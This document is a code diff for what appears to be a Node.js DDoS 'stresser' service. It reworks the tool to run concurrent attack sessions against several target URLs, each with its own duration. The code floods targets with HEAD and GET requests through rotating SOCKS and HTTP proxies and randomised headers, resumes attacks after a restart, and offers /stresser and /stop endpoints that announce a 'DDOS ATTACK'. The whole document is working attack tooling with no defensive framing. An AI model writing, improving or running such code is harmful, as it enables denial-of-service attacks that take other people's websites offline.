@@ -21,12 +21,7 @@ const ensureStateFileExists = () => {
   if (!fs.existsSync(stateFilePath)) {
     fs.writeFileSync(
       stateFilePath,
-      JSON.stringify({
-        continueAttack: false,
-        startTime: null,
-        duration: 0,
-        targetUrls: [],
-      })
+      JSON.stringify({ continueAttack: false, sessions: [] })
     );
   }
 };
@@ -38,41 +33,28 @@ const loadState = () => {
     return JSON.parse(data);
   } catch (error) {
     console.error(`Failed to read state file: ${error}`);
-    return {
-      continueAttack: false,
-      startTime: null,
-      duration: 0,
-      targetUrls: [],
-    };
+    return { continueAttack: false, sessions: [] };
   }
 };
 
 let state = loadState();
 let continueAttack = state.continueAttack;
-let startTime = state.startTime;
-let duration = state.duration;
-let targetUrls = state.targetUrls;
+let sessions = state.sessions || [];
 
-if (continueAttack && startTime && duration && targetUrls.length > 0) {
-  const endTime = startTime + duration;
+// Clean up expired sessions on startup
+sessions = sessions.filter((session) => {
+  const endTime = session.startTime + session.duration;
   if (Date.now() > endTime) {
-    continueAttack = false;
-    state = {
-      continueAttack: false,
-      startTime: null,
-      duration: 0,
-      targetUrls: [],
-    };
-    fs.writeFileSync(stateFilePath, JSON.stringify(state));
-    console.log(
-      rainbow(
-        `Attack stopped: Duration expired for previous attack on ${targetUrls.join(
-          ", "
-        )}.`
-      )
-    );
+    console.log(rainbow(`Session expired for ${session.url} on startup.`));
+    return false;
   }
+  return true;
+});
+if (sessions.length === 0) {
+  continueAttack = false;
 }
+state = { continueAttack, sessions };
+fs.writeFileSync(stateFilePath, JSON.stringify(state));
 
 const langHeaders = [
   "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
@@ -154,7 +136,7 @@ const loadProxies = () => {
 const estimateTotalRequests = (durationHours) => {
   const durationSeconds = durationHours * 60 * 60;
   const requestsPerBatch =
-    numThreads * REQUESTS_PER_THREAD * 2 * targetUrls.length; // HEAD + GET for each URL
+    numThreads * REQUESTS_PER_THREAD * 2 * sessions.length; // HEAD + GET for each active session
   const avgBatchDuration =
     batchDurations.length > 0
       ? batchDurations.reduce((sum, duration) => sum + duration, 0) /
@@ -165,34 +147,39 @@ const estimateTotalRequests = (durationHours) => {
   return Math.round(totalBatches * requestsPerBatch);
 };
 
-const performAttack = async (urls, agent, threadId) => {
-  if (!continueAttack || urls.length === 0) {
+const performAttack = async (sessions, agent, threadId) => {
+  if (!continueAttack || sessions.length === 0) {
     console.log(rainbow(`Thread ${threadId}: Stopped.`));
     return;
   }
 
-  if (startTime && duration) {
-    const endTime = startTime + duration;
-    if (Date.now() > endTime) {
-      continueAttack = false;
-      state = {
-        continueAttack: false,
-        startTime: null,
-        duration: 0,
-        targetUrls: [],
-      };
-      fs.writeFileSync(stateFilePath, JSON.stringify(state));
-      console.log(
-        rainbow(`Thread ${threadId}: Stopped due to duration expiration.`)
-      );
-      return;
-    }
+  // Filter active sessions
+  const activeSessions = sessions.filter((session) => {
+    const endTime = session.startTime + session.duration;
+    return Date.now() <= endTime;
+  });
+
+  if (activeSessions.length === 0) {
+    continueAttack = false;
+    state = { continueAttack: false, sessions: [] };
+    fs.writeFileSync(stateFilePath, JSON.stringify(state));
+    console.log(
+      rainbow(`Thread ${threadId}: Stopped due to all sessions expired.`)
+    );
+    return;
+  }
+
+  if (activeSessions.length < sessions.length) {
+    sessions = activeSessions;
+    state = { continueAttack, sessions };
+    fs.writeFileSync(stateFilePath, JSON.stringify(state));
   }
 
   const batchStartTime = Date.now();
   let successfulRequests = 0;
 
-  for (const url of urls) {
+  for (const session of activeSessions) {
+    const url = session.url;
     const headersForRequest = {
       "Content-Type": "application/x-www-form-urlencoded",
       "User-Agent": sanitizeUA(getRandomElement(userAgents())),
@@ -307,7 +294,7 @@ const performAttack = async (urls, agent, threadId) => {
   }
 
   if (continueAttack) {
-    setTimeout(() => performAttack(urls, agent, threadId), 0);
+    setTimeout(() => performAttack(sessions, agent, threadId), 0);
   }
 };
 
@@ -325,51 +312,31 @@ const startAttack = (url, durationHours) => {
     return false;
   }
 
-  if (!targetUrls.includes(url)) {
-    targetUrls.push(url);
-  }
+  const newSession = {
+    url,
+    startTime: Date.now(),
+    duration: durationHours * 60 * 60 * 1000,
+  };
 
+  sessions.push(newSession);
   continueAttack = true;
-  startTime = Date.now();
-  duration = durationHours * 60 * 60 * 1000;
-  totalRequestsSent = 0;
-  batchDurations = [];
-
-  state = { continueAttack, startTime, duration, targetUrls };
+  state = { continueAttack, sessions };
   fs.writeFileSync(stateFilePath, JSON.stringify(state));
 
   const estimatedRequests = estimateTotalRequests(durationHours);
   console.log(
     rainbow(
       `🚀 Starting Attack 🚀\n` +
-        `Targets: ${targetUrls.join(", ")}\n` +
-        `Duration: ${durationHours} hour(s)\n` +
+        `New Target: ${url}\n` +
+        `Active Targets: ${sessions.map((s) => s.url).join(", ")}\n` +
+        `Duration for New Session: ${durationHours} hour(s)\n` +
         `Threads: ${numThreads}\n` +
         `Requests per Thread per Batch: ${
-          REQUESTS_PER_THREAD * 2 * targetUrls.length
+          REQUESTS_PER_THREAD * 2 * sessions.length
         } (HEAD + GET per URL)\n` +
         `Estimated Total Requests: ${estimatedRequests.toLocaleString()}`
     )
   );
-
-  const attackTimeout = setTimeout(() => {
-    continueAttack = false;
-    state = {
-      continueAttack: false,
-      startTime: null,
-      duration: 0,
-      targetUrls: [],
-    };
-    fs.writeFileSync(stateFilePath, JSON.stringify(state));
-    console.log(
-      rainbow(
-        `🛑 Attack Stopped 🛑\n` +
-          `Targets: ${targetUrls.join(", ")}\n` +
-          `Duration: ${durationHours} hour(s)\n` +
-          `Total Requests Sent: ${totalRequestsSent.toLocaleString()}`
-      )
-    );
-  }, duration);
 
   for (let i = 0; i < numThreads; i++) {
     if (!continueAttack) break;
@@ -383,7 +350,7 @@ const startAttack = (url, durationHours) => {
         ? new SocksProxyAgent(proxyUrl)
         : new HttpsProxyAgent(proxyUrl);
 
-    performAttack(targetUrls, agent, i);
+    performAttack(sessions, agent, i);
   }
   return true;
 };
@@ -410,7 +377,7 @@ app.get("/stresser", (req, res) => {
 
   res.json({
     message: `Starting DDOS ATTACK with ${numThreads} threads, each sending ${
-      REQUESTS_PER_THREAD * 2 * targetUrls.length
+      REQUESTS_PER_THREAD * 2 * sessions.length
     } requests per batch to ${url} and existing targets.`,
   });
   startAttack(url, durationHours);
@@ -422,23 +389,18 @@ app.get("/stop", (req, res) => {
   }
 
   continueAttack = false;
-  state = {
-    continueAttack: false,
-    startTime: null,
-    duration: 0,
-    targetUrls: [],
-  };
+  state = { continueAttack: false, sessions: [] };
   fs.writeFileSync(stateFilePath, JSON.stringify(state));
 
   res.json({
-    message: `Attack stopped. Targets: ${targetUrls.join(
-      ", "
-    )}, Total Requests Sent: ${totalRequestsSent.toLocaleString()}`,
+    message: `Attack stopped. Targets: ${sessions
+      .map((s) => s.url)
+      .join(", ")}, Total Requests Sent: ${totalRequestsSent.toLocaleString()}`,
   });
   console.log(
     rainbow(
       `🛑 Attack Stopped Manually 🛑\n` +
-        `Targets: ${targetUrls.join(", ")}\n` +
+        `Targets: ${sessions.map((s) => s.url).join(", ")}\n` +
         `Total Requests Sent: ${totalRequestsSent.toLocaleString()}`
     )
   );
@@ -451,40 +413,54 @@ const port =
   Math.floor(Math.random() * (65535 - 1024 + 1)) + 1024;
 app.listen(port, () => {
   console.log(rainbow(`API running on http://localhost:${port}`));
-  if (continueAttack && startTime && duration && targetUrls.length > 0) {
+  if (continueAttack && sessions.length > 0) {
     console.log(rainbow("Resuming previous attack..."));
-    const remainingDuration =
-      (startTime + duration - Date.now()) / (60 * 60 * 1000);
-    if (remainingDuration > 0) {
-      const estimatedRequests = estimateTotalRequests(remainingDuration);
+    const activeSessions = sessions.filter(
+      (session) => Date.now() <= session.startTime + session.duration
+    );
+    if (activeSessions.length > 0) {
+      sessions = activeSessions;
+      state = { continueAttack, sessions };
+      fs.writeFileSync(stateFilePath, JSON.stringify(state));
+      const maxRemainingDuration = Math.max(
+        ...sessions.map(
+          (s) => (s.startTime + s.duration - Date.now()) / (60 * 60 * 1000)
+        )
+      );
+      const estimatedRequests = estimateTotalRequests(maxRemainingDuration);
       console.log(
         rainbow(
           `🔄 Resuming Attack 🔄\n` +
-            `Targets: ${targetUrls.join(", ")}\n` +
-            `Remaining Duration: ${remainingDuration.toFixed(2)} hour(s)\n` +
+            `Active Targets: ${sessions.map((s) => s.url).join(", ")}\n` +
+            `Max Remaining Duration: ${maxRemainingDuration.toFixed(
+              2
+            )} hour(s)\n` +
             `Threads: ${numThreads}\n` +
             `Requests per Thread per Batch: ${
-              REQUESTS_PER_THREAD * 2 * targetUrls.length
+              REQUESTS_PER_THREAD * 2 * sessions.length
             } (HEAD + GET per URL)\n` +
             `Estimated Total Requests: ${estimatedRequests.toLocaleString()}`
         )
       );
-      startAttack(targetUrls[0], remainingDuration);
+      for (let i = 0; i < numThreads; i++) {
+        const randomProxy = getRandomElement(loadProxies());
+        const proxyParts = randomProxy.split(":");
+        const proxyProtocol = proxyParts[0].startsWith("socks")
+          ? "socks5"
+          : "http";
+        const proxyUrl = `${proxyProtocol}://${proxyParts[0]}:${proxyParts[1]}`;
+        const agent =
+          proxyProtocol === "socks5"
+            ? new SocksProxyAgent(proxyUrl)
+            : new HttpsProxyAgent(proxyUrl);
+        performAttack(sessions, agent, i);
+      }
     } else {
       continueAttack = false;
-      state = {
-        continueAttack: false,
-        startTime: null,
-        duration: 0,
-        targetUrls: [],
-      };
+      state = { continueAttack: false, sessions: [] };
       fs.writeFileSync(stateFilePath, JSON.stringify(state));
       console.log(
-        rainbow(
-          `Attack stopped: Duration expired for previous attack on ${targetUrls.join(
-            ", "
-          )}.`
-        )
+        rainbow(`Attack stopped: All sessions expired for previous attack.`)
       );
     }
   }
